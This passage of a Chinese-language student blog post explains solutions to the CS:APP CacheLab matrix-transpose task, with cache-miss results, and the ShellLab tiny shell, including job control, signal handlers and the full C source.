            B[i + 7][j + 0] = B[i + 0][j + 7], B[i + 0][j + 7] = a0;
            B[i + 7][j + 1] = B[i + 1][j + 7], B[i + 1][j + 7] = a1;
            B[i + 7][j + 2] = B[i + 2][j + 7], B[i + 2][j + 7] = a2;
            B[i + 7][j + 3] = B[i + 3][j + 7], B[i + 3][j + 7] = a3;
            B[i + 7][j + 4] = B[i + 4][j + 7], B[i + 4][j + 7] = a4;
            B[i + 7][j + 5] = B[i + 5][j + 7], B[i + 5][j + 7] = a5;
            B[i + 7][j + 6] = B[i + 6][j + 7], B[i + 6][j + 7] = a6;
            B[i + 7][j + 7] = a7;
        }
        else { // 对角线不在块中，这部分和前面trans0()函数中的一样
            for (ii = i; ii < i + 8; ii++) {
                a0 = A[ii][j + 0];
                a1 = A[ii][j + 1];
                a2 = A[ii][j + 2];
                a3 = A[ii][j + 3];
                a4 = A[ii][j + 4];
                a5 = A[ii][j + 5];
                a6 = A[ii][j + 6];
                a7 = A[ii][j + 7];
                B[j + 0][ii] = a0;
                B[j + 1][ii] = a1;
                B[j + 2][ii] = a2;
                B[j + 3][ii] = a3;
                B[j + 4][ii] = a4;
                B[j + 5][ii] = a5;
                B[j + 6][ii] = a6;
                B[j + 7][ii] = a7;
            }
        }
    }
}
```

代码看起来有点吓人，因为我不喜欢用别人有水印的图，自己又懒得作图，靠打字有点难说，推荐不理解的同学拿上纸和笔跟着推导一下。不需要完全推到到最后，写个两三行应该就能领会其意。实在不明白请参考[参考1](https://blog.csdn.net/xbb224007/article/details/81103995)。

测试一下缺失数是否达到最低的`256`次

```
Function 0 (3 total)
Step 1: Validating and generating memory traces
Step 2: Evaluating performance (s=5, E=1, b=5)
func 0 (Transpose submission): hits:2018, misses:259, evictions:227
```

实际缺失`259`次，比理论预期多了三次。根据参考1，这是由于系统的额外三次开销，并非程序问题，即我们的思路于代码是对的，只需缺失`256`次即可完成矩阵转置

### 64 x 64

当矩阵规模来到`64 x 64`后，若继续将其划分为若干`8 x 8`有些不太合适。若`B[0][0]`加载于`set 0`中，则`B[1][0]`加载于`set 8`中，

`B[2][0]`加载于`set 16`中，`B[3][0]`加载于`set 24`中，缓存中最多只能同时放下B数组连续的4列，于是考虑将整个矩阵全划分为`4 x 4`大小的分块，得函数如下

```c
char trans_desc1[] = "4 x 4";
void trans1(int M, int N, int A[N][M], int B[M][N])
{
	int i, j, ii, a0, a1, a2, a3;
	for (i = 0; i < N; i += 4) {
		for (j = 0; j < M; j += 4) {
			for (ii = i; ii < i + 4; ii++) {
				a0 = A[ii][j + 0];
				a1 = A[ii][j + 1];
				a2 = A[ii][j + 2];
				a3 = A[ii][j + 3];
				B[j + 0][ii] = a0;
				B[j + 1][ii] = a1;
				B[j + 2][ii] = a2;
				B[j + 3][ii] = a3;
			}
		}
	}
}
```

测试结果为

```
Function 0 (1 total)
Step 1: Validating and generating memory traces
Step 2: Evaluating performance (s=5, E=1, b=5)
func 0 (4 x 4): hits:6498, misses:1699, evictions:1667
```

1699次缺失，不太理想。按这种分块，当访问如`A[0][0]`元素时，将`A[0][0]`至`A[0][７]`八个元素都加载入缓存中，而我们只使用了`A[0][0]`到`A[0][３]`四个元素，后四个元素被遗弃，后续需要使用这些元素时又得将这八个元素再次加载入内存，由此造成了不必要的缺失。同之前的思路，既然一次加载八个元素入缓存，后四个暂时用不上，考虑将其存储于某处，条件满足时再将其从暂存处取出使用，而不必再次将这些元素加载到缓存中，从而减少缺失次数。具体地，我们仍将`64 x 64`分为16个`8 x 8`大小的块，再将每个`8 x 8`的块分为4个`4 x 4`的块，分别取左上、右上、左下、右下四小块为一号块、二号块、三号块与四号块，如下图

{% asset_img cachelab_1.jpg %}

我们先取A数组前四行，转置后应放在B数组的一号块与三号块处，但鉴于两块互相覆盖，暂时将三号块的内容存于二号块中，代码如下

```c
for (ii = i; ii < i + 4; ii++) {
    a0 = A[ii][j + 0], a1 = A[ii][j + 1], a2 = A[ii][j + 2], a3 = A[ii][j + 3];
    a4 = A[ii][j + 4], a5 = A[ii][j + 5], a6 = A[ii][j + 6], a7 = A[ii][j + 7];
    B[j + 0][ii + 0] = a0, B[j + 1][ii + 0] = a1, B[j + 2][ii + 0] = a2, B[j + 3][ii + 0] = a3;
    B[j + 0][ii + 4] = a4, B[j + 1][ii + 4] = a5, B[j + 2][ii + 4] = a6, B[j + 3][ii + 4] = a7;
}
```

接下来，我们竖着放。举例：`A[4][0], A[5][0], A[6][0], A[7][0]`转置后应放置于`B[0][4], B[0][5], B[0][6], B[0][7]`中，按此方法将A数组第三块中的16个元素一列一列的放于对应的B数组第二块中。但原本B数组第二块中暂存着属于B数组第三块中的内容，因此顺序应是先将A数组对应列元素取出暂存，将B数组对应行元素也取出暂存，然后将A数组暂存值放入B数组第二块对应位置，将B数组取出暂存的值放入B数组第三块正确位置，代码如下

```c
for (jj = j; jj < j + 4; jj++) {
    /* 暂存A数组元素 */
    a0 = A[i + 4][jj], a1 = A[i + 5][jj], a2 = A[i + 6][jj], a3 = A[i + 7][jj];
    /* 暂存B数组第二块原本暂存的元素 */
    a4 = B[jj][i + 4], a5 = B[jj][i + 5], a6 = B[jj][i + 6], a7 = B[jj][i + 7];
    /* A数组第三块元素放入B数组第二块中 */
    B[jj][i + 4] = a0, B[jj][i + 5] = a1, B[jj][i + 6] = a2, B[jj][i + 7] = a3;
    /* 原本应该放于B数组第三块的元素 */
    B[jj + 4][i + 0] = a4, B[jj + 4][i + 1] = a5, B[jj + 4][i + 2] = a6, B[jj + 4][i + 3] = a7;
}
```

这样，A、B数组均只剩下第四块待完成，代码如下

```c
for (ii = i + 4; ii < i + 8; ii++) {
    a0 = A[ii][j + 4], a1 = A[ii][j + 5], a2 = A[ii][j + 6], a3 = A[ii][j + 7];
    B[j + 4][ii] = a0, B[j + 5][ii] = a1, B[j + 6][ii] = a2, B[j + 7][ii] = a3;
} 
```

完整代码

```c
if (M == 64) {
    for (i = 0; i < N; i += 8) {
        for (j = 0; j < M; j += 8) {
            for (ii = i; ii < i + 4; ii++) {
                a0 = A[ii][j + 0], a1 = A[ii][j + 1], a2 = A[ii][j + 2], a3 = A[ii][j + 3];
                a4 = A[ii][j + 4], a5 = A[ii][j + 5], a6 = A[ii][j + 6], a7 = A[ii][j + 7];
                B[j + 0][ii + 0] = a0, B[j + 1][ii + 0] = a1, B[j + 2][ii + 0] = a2, B[j + 3][ii + 0] = a3;
                B[j + 0][ii + 4] = a4, B[j + 1][ii + 4] = a5, B[j + 2][ii + 4] = a6, B[j + 3][ii + 4] = a7;
            }
            for (jj = j; jj < j + 4; jj++) {
                a0 = A[i + 4][jj], a1 = A[i + 5][jj], a2 = A[i + 6][jj], a3 = A[i + 7][jj];
                a4 = B[jj][i + 4], a5 = B[jj][i + 5], a6 = B[jj][i + 6], a7 = B[jj][i + 7];
                B[jj][i + 4] = a0, B[jj][i + 5] = a1, B[jj][i + 6] = a2, B[jj][i + 7] = a3;
                B[jj + 4][i + 0] = a4, B[jj + 4][i + 1] = a5, B[jj + 4][i + 2] = a6, B[jj + 4][i + 3] = a7;
            }
            for (ii = i + 4; ii < i + 8; ii++) {
                a0 = A[ii][j + 4], a1 = A[ii][j + 5], a2 = A[ii][j + 6], a3 = A[ii][j + 7];
                B[j + 4][ii] = a0, B[j + 5][ii] = a1, B[j + 6][ii] = a2, B[j + 7][ii] = a3;
            } 
        }
    }
}
```

测试结果

```
Function 0 (1 total)
Step 1: Validating and generating memory traces
Step 2: Evaluating performance (s=5, E=1, b=5)
func 0 (Transpose submission): hits:9066, misses:1179, evictions:1147
```

已达到满分要求

这里说明下为啥按上面方案这么做，其实我也是参考了别人的思路。我自己做想到了在转置第一块时将原本属于B数组第三块的内容暂存于B数组第二块，也就是上述的第一步，以此避免一些不必要的缺失。但后续我当时考虑的是B数组接下来的四行也这么做，这样的话B数组第一块和第四块的元素都是正确的，第二块和第三块的元素刚好反了，那么就再交换一轮就好。但是若是按我的思路，交换第二块和第三块将会比上面这种方法多很多缺失，别人这个确实比我的更加精妙

### 61 x 67

这个“不规则的”初看很难，实际上算是最简单的，直接分块即可

```c
for (i = 0; i < M; i += 16) {
    for (j = 0; j < N; j += 16) {
        for (jj = j; jj < j + 16 && jj < N; jj++) {
            for (ii = i; ii < i + 16 && i < M; ii++) {
                B[ii][jj] = A[jj][ii];
            }
        }
    }
}
```

注意，同等大小分块，采取B数组逐行扫描比采取A数组逐行扫描缺失数更低，测试结果

```
Function 0 (1 total)
Step 1: Validating and generating memory traces
Step 2: Evaluating performance (s=5, E=1, b=5)
func 0 (Transpose submission): hits:6673, misses:1908, evictions:1876
```

你问我为什么知道分`16 x16`大小？把所有可能都试一下就知道了，我测试了`4 x 4`大小到`20 x 20`大小的分块可能，我的机器上测出来是`16 x 16`分块的缺失数目最小，但看别人测出来是`17 x 17`最小，没深入钻这个，不想管了

### 最终结果

```
fez@papyruszzz:~/Desktop/CacheLab$ ./driver.py 
Part A: Testing cache simulator
Running ./test-csim
                        Your simulator     Reference simulator
Points (s,E,b)    Hits  Misses  Evicts    Hits  Misses  Evicts
     3 (1,1,1)       9       8       6       9       8       6  traces/yi2.trace
     3 (4,2,4)       4       5       2       4       5       2  traces/yi.trace
     3 (2,1,4)       2       3       1       2       3       1  traces/dave.trace
     3 (2,1,3)     167      71      67     167      71      67  traces/trans.trace
     3 (2,2,3)     201      37      29     201      37      29  traces/trans.trace
     3 (2,4,3)     212      26      10     212      26      10  traces/trans.trace
     3 (5,1,5)     231       7       0     231       7       0  traces/trans.trace
     6 (5,1,5)  265189   21775   21743  265189   21775   21743  traces/long.trace
    27


Part B: Testing transpose function
Running ./test-trans -M 32 -N 32
Running ./test-trans -M 64 -N 64
Running ./test-trans -M 61 -N 67

Cache Lab summary:
                        Points   Max pts      Misses
Csim correctness          27.0        27
Trans perf 32x32           8.0         8         259
Trans perf 64x64           8.0         8        1179
Trans perf 61x67          10.0        10        1908
          Total points    53.0        53
```

## 小结

今天(`2021/8/28`)起床没多久就把`Part B`做完了，然后就一直在写题解，现在已经是下午四点半了。手腕写的很疼，小结部分不想写太多。回看整个`CacheLab`实验经历，犯了太多错误。有轻视实验难度，阅读材料不认真看错题干的，有凭感觉想当然做的，也有意志不坚定自己没思考多久就求助题解的。总的来说，除了之前说的过的，仍有遗憾——我感觉我的题解没写的特别清晰，主要配图也几乎没有，可能有点难理解。但值得欣慰的是没有匆匆就略过这个实验，知道自己是看了很多别人的题解才做出来的，就更要花时间把东西理解透彻，确保自己真的懂了。今天花了一天时间写题解，从最初的状态顺着思路完整梳理了一遍过程，对整个缓存的命中、缺失与替换有了更深的理解，确实学到了不少东西。戒骄戒躁，脚踏实地。

# PerformanceLab

```
Cache Lab
At CMU we use this lab in place of the Performance Lab.
```

由[官网](http://csapp.cs.cmu.edu/3e/labs.html)描述，既然CMU都用`CacheLab`代替`PerformanceLab`，再加上自己时间有限，做过`CacheLab`就不做这个实验了

完结撒花！

# ShellLab

这个实验乍一看不难，实际上手也不很难，但要想完全解决仍不容易。其实坑还是不少，例如一上来就是残缺的程序，从哪个函数开始补全？是一个函数全补完了再弄别的函数还是齐头并进？从哪些功能的实现开始？做完回顾，觉得这个实验的确非常精妙，难度适中，初上手时看着要实现这么多功能，有这么多注意事项要考虑，脑子一下子转不过来。但无论某个功能实现起来有多难，用第八章学到的知识一定能实现，一点没有超纲。越做到后边越感受到实验作者的功力之深厚

首先，实验手册里那句`Read every word of Chapter 8(Exceptional Control Flow) in your textbook.`非常重要，所有的谜题都能在这一章找到答案。搭建`shell`时，同样按照实验手册里的建议，根据`tshref`例程运行从`trace0`到`trace16`的结果，一步一步来构建自己的`shell`

## trace01

最开始实验时，我选择先从`eval()`函数开始入手，模仿书上示例里的`eval()`搭建自己的`eval()`。先将书上这个的函数代码原封不动复制过来，测试`trace01`文件，但由于本身这个测试没有任何输出，我不很确定这个测试着重点在哪，反正自己的程序也是没有任何返回，和例程运行结果一样就行

## trace02

坦白讲，`trace02`的作用我没太弄清，看似是实现`builtin()`函数，但结合`trace03`看，两个文件似乎让我做同一件事，不太明白

## trace03

按注释，此函数测试`shell`内置的`quit()`函数，因此应该修改`builtin()`函数实现对应功能，代码如下

```c
int builtin_cmd(char **argv) 
{
    if (!strcmp(argv[0], "quit"))
        exit(0);
    if (!strcmp(argv[0], "jobs"))
        return 1;
    if (!strcmp(argv[0], "fg"))
        return 1;
    if (!strcmp(argv[0], "bg"))
        return 1;
    return 0;     /* not a builtin command */
}
```

我的`builtin_cmd()`函数逻辑为，只做判断，不实际运行（除`quit()`函数）

## trace04

由例程的运行结果分析知，需要实现后台作业，并将其信息显示在屏幕上，因此修改`eval()`函数实现如下

```c
void eval(char *cmdline) 
{   
    char* argv[MAXARGS];            /* Argument list execve() */
    char buf[MAXLINE];              /* Holds modified command line */
    int bg, state;                  /* Should the job run in bg or fg? */
    pid_t pid;                      /* Process id */
    sigset_t mask_one, mask_all, prev_one;

    Sigemptyset(&mask_one);
    Sigaddset(&mask_one, SIGCHLD);
    Sigfillset(&mask_all);

    strcpy(buf, cmdline);
    bg = parseline(buf, argv);
    if (argv[0] == NULL)            /* Ignore empty lines */
        return;     

    if (!builtin_cmd(argv)) {
        Sigprocmask(SIG_SETMASK, &mask_one, &prev_one);

        if ((pid = Fork()) == 0) {  /* Child runs user job */
            Sigprocmask(SIG_SETMASK, &prev_one, NULL);
            setpgid(0, 0);
            if (execve(argv[0], argv, environ) < 0) {
                printf("%s: Command not found.\n", argv[0]);
                exit(0);
            }
        }

        state = bg ? BG : FG;
           
        /* Block all signals.This process cannot be interrupted */
        Sigprocmask(SIG_SETMASK, &mask_all, NULL);
        addjob(jobs, pid, state, cmdline);
        Sigprocmask(SIG_SETMASK, &prev_one, NULL);

        /* Parent waits for foreground job to terminate */
        if (bg) {
            printf("[%d] (%d) %s", pid2jid(pid), pid, cmdline);
        }
        else waitfg(pid);     
    }
    else {      /* builtin command */
        if (!strcmp(argv[0], "jobs"))
            listjobs(jobs);
        else do_bgfg(argv);
    }

    return;
}
```

这里我将最终版完整的`eval()`函数直接放出来，因为如果每个`trace`文件都按最初实现的过程一步步重新模拟工作量太大，个人觉得这个实验难度也不很大，加上代码均配有注释，阅读理解起来难度不会很大，后面`trace`涉及改进此函数的都不再逐步演示，直接参考本代码即可。注意`eval()`几个难点，考虑竞争，`addjob()`函数的执行是绝不可打断的，所以执行前屏蔽所有信号。且`addjob()`须在处理子进程返回`SIGCHLD`信号前将子进程添加至`jobs`列表中，因此在判断输入的命令不是`shell`内置命令之后，立刻屏蔽`SIGCHLD`信号，但是子进程在调用`execve()`函数前又需要取消该信号的屏蔽。`setpgid()`功能请见实验手册

## trace05

这个测试的重点在于`jobs`命令的实现，该命令要实现的功能是打印所有后台程序。在本实验自带的辅助函数里有一个`listjobs()`函数，其功能为打印所有进程，无论前台后台，将其稍作修改，即可满足`jobs`指令功能

```c
void listjobs(struct job_t *jobs) 
{
    int i;
    
    for (i = 0; i < MAXJOBS; i++) {
	    if (jobs[i].pid != 0 && jobs[i].state != FG) {
	        printf("[%d] (%d) ", jobs[i].jid, jobs[i].pid);
	        switch (jobs[i].state) {
		    case BG: 
		        printf("Running ");
		        break;
		    case ST: 
		        printf("Stopped ");
		        break;
	        default:
		        printf("listjobs: Internal error: job[%d].state=%d ", 
			       i, jobs[i].state);
	        }
	        printf("%s", jobs[i].cmdline);
	    }
    }
}
```

## trace06

要求实现捕捉`SIGINT`信号，终止前台程序

```c
void sigint_handler(int sig) 
{
    int olderrno = errno;

    pid_t pid = fgpid(jobs);
    if (pid != 0)
        kill(-pid, SIGINT);
    else printf("No foreground job is running!\n");

    errno = olderrno;
}
```

注意`kill()`函数应向前台进程所在的整个进程组发送信号，因此是负的`pid`值

## trace07

由`eval()`函数里`setpgid(0, 0)`已实现

## trace08

要求实现捕捉`SIGTSTP`信号，停止前台程序

```c
void sigtstp_handler(int sig) 
{
    int olderrno = errno;

    pid_t pid = fgpid(jobs);
    if (pid != 0)
        kill(-pid, SIGTSTP);
    else printf("No foreground job is running!\n");

    errno = olderrno;
}
```

## trace09 & trace10

都是关于`do_bgfg()`函数的实现

```c
void do_bgfg(char **argv) 
{
    int jid = 0, pid = 0, isFG = 0;
    char* cp;
    struct job_t* job = NULL;

    /* Should the job run in bg or fg? */
    isFG = (!strcmp(argv[0], "fg")) ? 1 : 0;

    if (argv[1] == NULL) {  /* Parameter missing */
        if (isFG)
            printf("fg command requires PID or %%jobid argument\n");
        else
            printf("bg command requires PID or %%jobid argument\n");
        return;
    }

    cp = argv[1];
    if (cp[0] == '%') { /* The number stands for jid */
        cp++;
        /* Check whether the ID is valid */
        for (char* tmp = cp; *tmp != '\0'; tmp++) {
            if (*tmp < '0' || *tmp > '9') {
                if (isFG)
                    printf("fg: argument must be a PID or %%jobid\n");
                else
                    printf("bg: argument must be a PID or %%jobid\n");
                return;
            }
        }
        jid = atoi(cp);
        job = getjobjid(jobs, jid);
    }
    else {              /* The number stands for pid */
        /* Check whether the ID is valid */
        for (char* tmp = cp; *tmp != '\0'; tmp++) {
            if (*tmp < '0' || *tmp > '9') {
                if (isFG)
                    printf("fg: argument must be a PID or %%jobid\n");
                else
                    printf("bg: argument must be a PID or %%jobid\n");
                return;
            }
        }
        pid = atoi(cp);
        job = getjobpid(jobs, pid);
    }

    if (job == NULL) {
        if (argv[1][0] == '%')
            printf("%%%d: No such job\n", jid);
        else
            printf("(%d): No such process\n", pid);
        return;
    }

    /* Since we want to put the process in the 
    foreground or background, restart it if it was stopped */
    kill(-job->pid, SIGCONT);

    if (isFG) {
        job->state = FG;
        waitfg(job->pid);
    }
    else {
        printf("[%d] (%d) %s", job->jid, job->pid, job->cmdline);
        job->state = BG;
    }
    
}
```

## trace11 & trace 12

发送信号给整个进程组成员，在`trace06, trace08`已实现

## trace13 & trace 14 & trace15 & trace16

没啥新东西

## 完整代码

```c
/* 
 * tsh - A tiny shell program with job control
 * 
 * <Put your name and login ID here>
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <ctype.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>

/* Misc manifest constants */
#define MAXLINE    1024   /* max line size */
#define MAXARGS     128   /* max args on a command line */
#define MAXJOBS      16   /* max jobs at any point in time */
#define MAXJID    1<<16   /* max job ID */

/* Job states */
#define UNDEF 0 /* undefined */
#define FG 1    /* running in foreground */
#define BG 2    /* running in background */
#define ST 3    /* stopped */

/* 
 * Jobs states: FG (foreground), BG (background), ST (stopped)
 * Job state transitions and enabling actions:
 *     FG -> ST  : ctrl-z
 *     ST -> FG  : fg command
 *     ST -> BG  : bg command
 *     BG -> FG  : fg command
 * At most 1 job can be in the FG state.
 */

/* Global variables */
extern char **environ;      /* defined in libc */
char prompt[] = "tsh> ";    /* command line prompt (DO NOT CHANGE) */
int verbose = 0;            /* if true, print additional output */
int nextjid = 1;            /* next job ID to allocate */
char sbuf[MAXLINE];         /* for composing sprintf messages */

struct job_t {              /* The job struct */
    pid_t pid;              /* job PID */
    int jid;                /* job ID [1, 2, ...] */
    int state;              /* UNDEF, BG, FG, or ST */
    char cmdline[MAXLINE];  /* command line */
};
struct job_t jobs[MAXJOBS]; /* The job list */
/* End global variables */


/* Function prototypes */

/* Here are the functions that you will implement */
void eval(char *cmdline);
int builtin_cmd(char **argv);
void do_bgfg(char **argv);
void waitfg(pid_t pid);

void sigchld_handler(int sig);
void sigtstp_handler(int sig);
void sigint_handler(int sig);

/* Here are helper routines that we've provided for you */
int parseline(const char *cmdline, char **argv); 
void sigquit_handler(int sig);

void clearjob(struct job_t *job);
void initjobs(struct job_t *jobs);
int maxjid(struct job_t *jobs); 
int addjob(struct job_t *jobs, pid_t pid, int state, char *cmdline);
int deletejob(struct job_t *jobs, pid_t pid); 
pid_t fgpid(struct job_t *jobs);
struct job_t *getjobpid(struct job_t *jobs, pid_t pid);
struct job_t *getjobjid(struct job_t *jobs, int jid); 
int pid2jid(pid_t pid); 
void listjobs(struct job_t *jobs);

void usage(void);
void unix_error(char *msg);
void app_error(char *msg);
typedef void handler_t(int);
handler_t *Signal(int signum, handler_t *handler);

/* Self-defining function */
pid_t Fork(void);
void Sigprocmask(int how, const sigset_t* set, sigset_t* oldset);
void Sigemptyset(sigset_t* set);
void Sigfillset(sigset_t* set);
void Sigaddset(sigset_t* set, int signum);
void Sigdelset(sigset_t* set, int signum);

/*
 * main - The shell's main routine 
 */
int main(int argc, char** argv)
{
    char c;
    char cmdline[MAXLINE];
    int emit_prompt = 1; /* emit prompt (default) */

    /* Redirect stderr to stdout (so that driver will get all output
     * on the pipe connected to stdout) */
    dup2(1, 2);

    /* Parse the command line */
    while ((c = getopt(argc, argv, "hvp")) != EOF) {
        switch (c) {
        case 'h':             /* print help message */
            usage();
            break;
        case 'v':             /* emit additional diagnostic info */
            verbose = 1;
            break;
        case 'p':             /* don't print a prompt */
            emit_prompt = 0;  /* handy for automatic testing */
            break;
        default:
            usage();
        }
    }

    /* Install the signal handlers */

    /* These are the ones you will need to implement */
    Signal(SIGINT, sigint_handler);   /* ctrl-c */
    Signal(SIGTSTP, sigtstp_handler);  /* ctrl-z */
    Signal(SIGCHLD, sigchld_handler);  /* Terminated or stopped child */

    /* This one provides a clean way to kill the shell */
    Signal(SIGQUIT, sigquit_handler);

    /* Initialize the job list */
    initjobs(jobs);

    /* Execute the shell's read/eval loop */
    while (1) {

        /* Read command line */
        if (emit_prompt) {
            printf("%s", prompt);
            fflush(stdout);
        }
        if ((fgets(cmdline, MAXLINE, stdin) == NULL) && ferror(stdin))
            app_error("fgets error");
        if (feof(stdin)) { /* End of file (ctrl-d) */
            fflush(stdout);
            exit(0);
        }

        /* Evaluate the command line */
        eval(cmdline);
        fflush(stdout);
        fflush(stdout);
    }

    exit(0); /* control never reaches here */
}
  
/* 
 * eval - Evaluate the command line that the user has just typed in
 * 
 * If the user has requested a built-in command (quit, jobs, bg or fg)
 * then execute it immediately. Otherwise, fork a child process and
 * run the job in the context of the child. If the job is running in
 * the foreground, wait for it to terminate and then return.  Note:
 * each child process must have a unique process group ID so that our
 * background children don't receive SIGINT (SIGTSTP) from the kernel
 * when we type ctrl-c (ctrl-z) at the keyboard.  
*/
void eval(char *cmdline) 
{   
    char* argv[MAXARGS];            /* Argument list execve() */
    char buf[MAXLINE];              /* Holds modified command line */
    int bg, state;                  /* Should the job run in bg or fg? */
    pid_t pid;                      /* Process id */
    sigset_t mask_one, mask_all, prev_one;

    Sigemptyset(&mask_one);
    Sigaddset(&mask_one, SIGCHLD);
    Sigfillset(&mask_all);

    strcpy(buf, cmdline);
    bg = parseline(buf, argv);
    if (argv[0] == NULL)            /* Ignore empty lines */
        return;     

    if (!builtin_cmd(argv)) {
        Sigprocmask(SIG_SETMASK, &mask_one, &prev_one);

        if ((pid = Fork()) == 0) {  /* Child runs user job */
            Sigprocmask(SIG_SETMASK, &prev_one, NULL);
            setpgid(0, 0);
            if (execve(argv[0], argv, environ) < 0) {
                printf("%s: Command not found.\n", argv[0]);
                exit(0);
            }
        }

        state = bg ? BG : FG;
           
        /* Block all signals.This process cannot be interrupted */
        Sigprocmask(SIG_SETMASK, &mask_all, NULL);
        addjob(jobs, pid, state, cmdline);
        Sigprocmask(SIG_SETMASK, &prev_one, NULL);

        /* Parent waits for foreground job to terminate */
        if (bg) {
            printf("[%d] (%d) %s", pid2jid(pid), pid, cmdline);
        }
        else waitfg(pid);     
    }
    else {      /* builtin command */
        if (!strcmp(argv[0], "jobs"))
            listjobs(jobs);
        else do_bgfg(argv);
    }

    return;
}


/* 
 * parseline - Parse the command line and build the argv array.
 * 
 * Characters enclosed in single quotes are treated as a single
 * argument.  Return true if the user has requested a BG job, false if
 * the user has requested a FG job.  
 */
int parseline(const char* cmdline, char** argv)
{
    static char array[MAXLINE]; /* holds local copy of command line */
    char* buf = array;          /* ptr that traverses command line */
    char* delim;                /* points to first space delimiter */
    int argc;                   /* number of args */
    int bg;                     /* background job? */

    strcpy(buf, cmdline);
    buf[strlen(buf) - 1] = ' ';  /* replace trailing '\n' with space */
    while (*buf && (*buf == ' ')) /* ignore leading spaces */
        buf++;

    /* Build the argv list */
    argc = 0;
    if (*buf == '\'') {
        buf++;
        delim = strchr(buf, '\'');
    }
    else {
        delim = strchr(buf, ' ');
    }

    while (delim) {
        argv[argc++] = buf;
        *delim = '\0';
        buf = delim + 1;
        while (*buf && (*buf == ' ')) /* ignore spaces */
            buf++;

        if (*buf == '\'') {
            buf++;
            delim = strchr(buf, '\'');
        }
        else {
            delim = strchr(buf, ' ');
        }
    }
    argv[argc] = NULL;

    if (argc == 0)  /* ignore blank line */
        return 1;

    /* should the job run in the background? */
    if ((bg = (*argv[argc - 1] == '&')) != 0) {
        argv[--argc] = NULL;
    }
    return bg;
}

/* 
 * builtin_cmd - If the user has typed a built-in command then execute
 *    it immediately.  
 */
int builtin_cmd(char **argv) 
{
    if (!strcmp(argv[0], "quit"))
        exit(0);
    if (!strcmp(argv[0], "jobs"))
        return 1;
    if (!strcmp(argv[0], "fg"))
        return 1;
    if (!strcmp(argv[0], "bg"))
        return 1;
    return 0;     /* not a builtin command */
}

/* 
 * do_bgfg - Execute the builtin bg and fg commands
 */
void do_bgfg(char **argv) 
{
    int jid = 0, pid = 0, isFG = 0;
    char* cp;
    struct job_t* job = NULL;

    /* Should the job run in bg or fg? */
    isFG = (!strcmp(argv[0], "fg")) ? 1 : 0;

    if (argv[1] == NULL) {  /* Parameter missing */
        if (isFG)
            printf("fg command requires PID or %%jobid argument\n");
        else
            printf("bg command requires PID or %%jobid argument\n");
        return;
    }

    cp = argv[1];
    if (cp[0] == '%') { /* The number stands for jid */
        cp++;
        /* Check whether the ID is valid */
        for (char* tmp = cp; *tmp != '\0'; tmp++) {
            if (*tmp < '0' || *tmp > '9') {
                if (isFG)
                    printf("fg: argument must be a PID or %%jobid\n");
                else
                    printf("bg: argument must be a PID or %%jobid\n");
                return;
            }
        }
        jid = atoi(cp);
        job = getjobjid(jobs, jid);
    }
    else {              /* The number stands for pid */
        /* Check whether the ID is valid */
        for (char* tmp = cp; *tmp != '\0'; tmp++) {
            if (*tmp < '0' || *tmp > '9') {
                if (isFG)
                    printf("fg: argument must be a PID or %%jobid\n");
                else
                    printf("bg: argument must be a PID or %%jobid\n");
                return;
            }
        }
        pid = atoi(cp);
        job = getjobpid(jobs, pid);
    }

    if (job == NULL) {
        if (argv[1][0] == '%')
            printf("%%%d: No such job\n", jid);
        else
            printf("(%d): No such process\n", pid);
        return;
    }

    /* Since we want to put the process in the 
    foreground or background, restart it if it was stopped */
    kill(-job->pid, SIGCONT);

    if (isFG) {
        job->state = FG;
        waitfg(job->pid);
    }
    else {
        printf("[%d] (%d) %s", job->jid, job->pid, job->cmdline);
        job->state = BG;
    }
    
}

/* 
 * waitfg - Block until process pid is no longer the foreground process
 */
void waitfg(pid_t pid)
{
    sigset_t mask;

    /* Any signal will wake up the process */
    Sigemptyset(&mask);

    /* As long as there are foreground processes running, sleep */
    while (fgpid(jobs) > 0) {
        sigsuspend(&mask);
    }
}

/*****************
 * Signal handlers
 *****************/

/* 
 * sigchld_handler - The kernel sends a SIGCHLD to the shell whenever
 *     a child job terminates (becomes a zombie), or stops because it
 *     received a SIGSTOP or SIGTSTP signal. The handler reaps all
 *     available zombie children, but doesn't wait for any other
 *     currently running children to terminate.  
 */
void sigchld_handler(int sig) 
{
    pid_t pid;
    int status, olderrno = errno;
    sigset_t mask_all, prev_all;

    Sigfillset(&mask_all);

    /* The next step may involves deleting the job and cannot be interrupted */
    Sigprocmask(SIG_BLOCK, &mask_all, &prev_all);
    while ((pid = waitpid(-1, &status, WNOHANG | WUNTRACED)) > 0) {
        
        struct job_t* job = getjobpid(jobs, pid);

        /* The program runs normally */
        if (WIFEXITED(status)) {
            deletejob(jobs, pid);
        }
        /* Been suspended */
        else if (WIFSTOPPED(status)) {
            printf("Job [%d] (%d) stopped by signal %d\n", job->jid, job->pid, WSTOPSIG(status));
            job->state = ST;
        }
        /* Be terminated */
        else if (WIFSIGNALED(status)) {
            printf("Job [%d] (%d) terminated by signal %d\n", job->jid, job->pid, WTERMSIG(status));
            deletejob(jobs, pid);
        }
    }
    Sigprocmask(SIG_SETMASK, &prev_all, NULL);

    errno = olderrno;

    return;
}

/* 
 * sigint_handler - The kernel sends a SIGINT to the shell whenver the
 *    user types ctrl-c at the keyboard.  Catch it and send it along
 *    to the foreground job.  
 */
void sigint_handler(int sig) 
{
    int olderrno = errno;

    pid_t pid = fgpid(jobs);
    if (pid != 0)
        kill(-pid, SIGINT);
    else printf("No foreground job is running!\n");

    errno = olderrno;
}

/*
 * sigtstp_handler - The kernel sends a SIGTSTP to the shell whenever
 *     the user types ctrl-z at the keyboard. Catch it and suspend the
 *     foreground job by sending it a SIGTSTP.  
 */
void sigtstp_handler(int sig) 
{
    int olderrno = errno;

    pid_t pid = fgpid(jobs);
    if (pid != 0)
        kill(-pid, SIGTSTP);
    else printf("No foreground job is running!\n");

    errno = olderrno;
}

/*********************
 * End signal handlers
 *********************/

/***********************************************
 * Helper routines that manipulate the job list
 **********************************************/

/* clearjob - Clear the entries in a job struct */
void clearjob(struct job_t *job) {
    job->pid = 0;
    job->jid = 0;
    job->state = UNDEF;
    job->cmdline[0] = '\0';
}

/* initjobs - Initialize the job list */
void initjobs(struct job_t *jobs) {
    int i;

    for (i = 0; i < MAXJOBS; i++)
	clearjob(&jobs[i]);
}

/* maxjid - Returns largest allocated job ID */
int maxjid(struct job_t *jobs) 
{
    int i, max=0;

    for (i = 0; i < MAXJOBS; i++)
	if (jobs[i].jid > max)
	    max = jobs[i].jid;
    return max;
}

